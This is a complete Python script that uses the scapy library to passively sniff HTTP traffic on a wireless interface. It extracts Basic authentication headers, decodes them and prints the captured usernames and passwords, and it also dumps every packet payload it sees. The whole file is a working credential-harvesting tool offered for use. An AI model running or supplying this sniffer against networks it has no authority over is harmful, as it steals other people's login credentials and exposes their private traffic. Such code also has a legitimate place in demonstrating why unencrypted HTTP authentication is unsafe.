#!/usr/bin/python

import sys
import re
from base64 import b64decode

from scapy.all import sniff


class AuthSniffer(object):
    def __init__(self, dev="wlan0"):
        self.dev = dev
        self.flush()

    def flush(self):
        self.auths_list = {}

    def _handle_packet(self, pkt):
        tcp = pkt.getlayer("TCP")
        match = re.search(r"Authorization: Basic (.+)", str(tcp.payload))
        print str(tcp.payload)

        if match:
            auth_str = b64decode(match.group(1))
            auth = auth_str.split(":")
        #   print "%s:%s" % (auth[0], auth[1])
            if (auth[0] not in self.auths_list.keys()):
                self.auths_list[auth[0]] = auth[1]
                print "User:", auth[0], "Pass: ", auth[1]

    def sniff(self):
        self.flush()
        try:
            print "Start sniffing on %s.." % self.dev
            sniff(iface=self.dev, store=0,
                  filter="tcp and port 80", prn=self._handle_packet)
        except KeyboardInterrupt:
            print "Stop sniffing..."


if __name__ == "__main__":
    if len(sys.argv) < 2:
        dev = "wlan0"
    else:
        dev = sys.argv[1]
    sniffer = AuthSniffer(dev=dev)
    sniffer.sniff()
